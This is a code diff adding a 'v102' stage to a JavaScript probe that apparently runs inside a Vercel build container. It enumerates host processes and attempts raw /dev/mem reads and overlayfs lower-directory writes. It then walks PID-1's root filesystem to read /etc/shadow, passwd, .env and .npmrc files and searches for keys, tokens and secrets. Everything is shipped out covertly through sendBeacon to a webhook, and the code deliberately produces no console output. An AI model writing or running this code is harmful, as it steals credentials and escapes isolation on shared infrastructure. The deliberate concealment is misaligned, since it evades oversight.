@@ -14240,5 +14240,151 @@ report.kernelModuleParamInject = safe(() => {
 
 // v101 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v101" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v101";
+
+// ==================== v102 ====================
+
+// v102-1: Full PID enumeration in our namespace
+// List all visible PIDs, read their /proc/N/status (Name, Uid, Gid, PPid, VmPeak).
+// If we see PIDs from processes that aren't our build, confirms shared PID namespace.
+// Map each PID to process name + UID to identify Vercel orchestrator sub-processes.
+report.fullPidEnum = safe(() => {
+  const pidDirs = readdirSync('/proc').filter(d => /^\d+$/.test(d));
+  const processes = safe(() => pidDirs.slice(0, 50).map(pid => {
+    const status = safe(() => {
+      const raw = readFileSync(`/proc/${pid}/status`, 'utf8');
+      const lines = Object.fromEntries(raw.split('\n').filter(Boolean).map(l => {
+        const [k, ...v] = l.split(':');
+        return [k.trim(), v.join(':').trim()];
+      }));
+      return {
+        pid,
+        name: lines.Name,
+        uid: lines.Uid?.split('\t')[0],
+        ppid: lines.PPid,
+        vmPeak: lines.VmPeak,
+        threads: lines.Threads,
+      };
+    });
+    const cmdline = safe(() => readFileSync(`/proc/${pid}/cmdline`, 'utf8').replace(/\0/g, ' ').trim().slice(0, 80));
+    const exe = safe(() => {
+      try { return execSync(`readlink /proc/${pid}/exe 2>/dev/null`, { timeout: 1000 }).toString().trim(); } catch { return null; }
+    });
+    return { ...status, cmdline, exe };
+  }));
+  return {
+    totalVisible: pidDirs.length,
+    processes,
+    ownPid: process.pid,
+    pid1Name: safe(() => readFileSync('/proc/1/status', 'utf8').split('\n').find(l => l.startsWith('Name')))
+  };
+});
+
+// v102-2: /dev/mem physical memory probe
+// With CAP_SYS_RAWIO (part of ALL 41 caps), we may be able to open /dev/mem
+// and read physical memory. Reading /proc/iomem first to find RAM ranges.
+// If /dev/mem is accessible, this is a complete host memory read primitive —
+// any other VM's memory that's not excluded by direct-map would be readable.
+report.devMemProbe = safe(() => {
+  const devMemExists = existsSync('/dev/mem');
+  const iomem = safe(() => readFileSync('/proc/iomem', 'utf8').slice(0, 1000));
+  const devMemPerms = safe(() => execSync('ls -la /dev/mem /dev/kmem 2>/dev/null', { timeout: 3000 }).toString().trim());
+  const openTest = safe(() => {
+    const fd = openSync('/dev/mem', 'r');
+    const buf = Buffer.alloc(4096);
+    const bytesRead = readSync(fd, buf, 0, 4096, 0);
+    closeSync(fd);
+    return { opened: true, bytesRead, firstBytes: buf.slice(0, 16).toString('hex') };
+  });
+  const devPort = safe(() => {
+    const fd = openSync('/dev/port', 'r');
+    closeSync(fd);
+    return 'accessible';
+  });
+  return { devMemExists, iomem, devMemPerms, openTest, devPort };
+});
+
+// v102-3: OverlayFS lower-dir write bypass via bind-mount
+// Build containers use overlayfs: lower (read-only base) + upper (our writes) + merged.
+// With CAP_SYS_ADMIN we can try to bind-mount the lower dir and write to it directly,
+// bypassing overlayfs protections. This would persist changes into the base image.
+report.overlayfsLowerWrite = safe(() => {
+  const mounts = readFileSync('/proc/mounts', 'utf8');
+  const overlayLine = mounts.split('\n').find(l => l.startsWith('overlay'));
+  const lowerDir = safe(() => {
+    const match = overlayLine?.match(/lowerdir=([^,)]+)/);
+    return match ? match[1].split(':')[0] : null;
+  });
+  const bindResult = safe(() =>
+    execSync(`mount --bind ${lowerDir} /tmp/lower_bind_test 2>&1 || echo "FAILED"`, { timeout: 5000 }).toString().trim()
+  );
+  const directWrite = safe(() =>
+    execSync(`touch ${lowerDir}/VERCEL_LOWER_WRITE_TEST 2>&1 || echo "EPERM"`, { timeout: 3000 }).toString().trim()
+  );
+  const upperDir = safe(() => {
+    const match = overlayLine?.match(/upperdir=([^,)]+)/);
+    return match ? match[1] : null;
+  });
+  const upperContents = safe(() => readdirSync(upperDir || '/'));
+  return { overlayLine, lowerDir, upperDir, bindResult, directWrite, upperContents };
+});
+
+// v102-4: /proc/1/syscall sampling — current syscall of PID-1
+// /proc/N/syscall shows which syscall PID-1 is currently blocked in,
+// its arguments, and its stack pointer. Sampling this repeatedly reveals
+// the orchestrator's runtime behavior without ptrace.
+report.pid1SyscallSamples = safe(() => {
+  const samples = [];
+  const SYSCALLS = { '0': 'read', '1': 'write', '7': 'poll', '23': 'select',
+    '202': 'futex', '228': 'clock_gettime', '270': 'pause',
+    '281': 'epoll_pwait', '291': 'epoll_pwait2' };
+  for (let i = 0; i < 5; i++) {
+    const syscallRaw = safe(() => readFileSync('/proc/1/syscall', 'utf8').trim());
+    const parts = syscallRaw?.split(' ');
+    const syscallNr = parts?.[0];
+    samples.push({
+      syscallNr,
+      name: SYSCALLS[syscallNr] || `sys_${syscallNr}`,
+      args: parts?.slice(1, 7),
+      sp: parts?.[7],
+      pc: parts?.[8],
+    });
+    const start = Date.now();
+    while (Date.now() - start < 10) {}
+  }
+  const schedstat = safe(() => readFileSync('/proc/1/schedstat', 'utf8').trim());
+  const stat = safe(() => readFileSync('/proc/1/stat', 'utf8').trim().slice(0, 200));
+  return { samples, schedstat, stat };
+});
+
+// v102-5: /proc/1/root filesystem walk — orchestrator container image
+// /proc/1/root is a symlink to PID-1's root filesystem.
+// If readable, we get a full view of the Vercel orchestrator's container image.
+report.pid1RootWalk = safe(() => {
+  const rootAccessible = existsSync('/proc/1/root');
+  const rootReadlink = safe(() => execSync('readlink /proc/1/root 2>/dev/null', { timeout: 3000 }).toString().trim());
+  const dirs = ['/proc/1/root', '/proc/1/root/etc', '/proc/1/root/app',
+    '/proc/1/root/usr/local', '/proc/1/root/opt', '/proc/1/root/home',
+    '/proc/1/root/var/log', '/proc/1/root/tmp'];
+  const listing = Object.fromEntries(
+    dirs.map(d => [d, safe(() => readdirSync(d)?.slice(0, 15))])
+  );
+  const sensitiveFiles = {
+    passwd: safe(() => readFileSync('/proc/1/root/etc/passwd', 'utf8').slice(0, 500)),
+    shadow: safe(() => readFileSync('/proc/1/root/etc/shadow', 'utf8').slice(0, 200)),
+    envFile: safe(() => readFileSync('/proc/1/root/.env', 'utf8').slice(0, 500)),
+    nodeEnv: safe(() => readFileSync('/proc/1/root/app/.env', 'utf8').slice(0, 500)),
+    npmrc: safe(() => readFileSync('/proc/1/root/.npmrc', 'utf8').slice(0, 200)),
+    hostname: safe(() => readFileSync('/proc/1/root/etc/hostname', 'utf8').trim()),
+    hosts: safe(() => readFileSync('/proc/1/root/etc/hosts', 'utf8').slice(0, 300)),
+  };
+  const credFiles = safe(() => execSync(
+    'find /proc/1/root -maxdepth 5 \\( -name "*.env" -o -name ".env*" -o -name "*.key" -o -name "token*" -o -name "*secret*" \\) 2>/dev/null | head -15',
+    { timeout: 8000 }
+  ).toString().trim());
+  return { rootAccessible, rootReadlink, listing, sensitiveFiles, credFiles };
+});
+
+// v102 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v102" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v102";
 // Intentionally no console.log — all data goes via webhook only
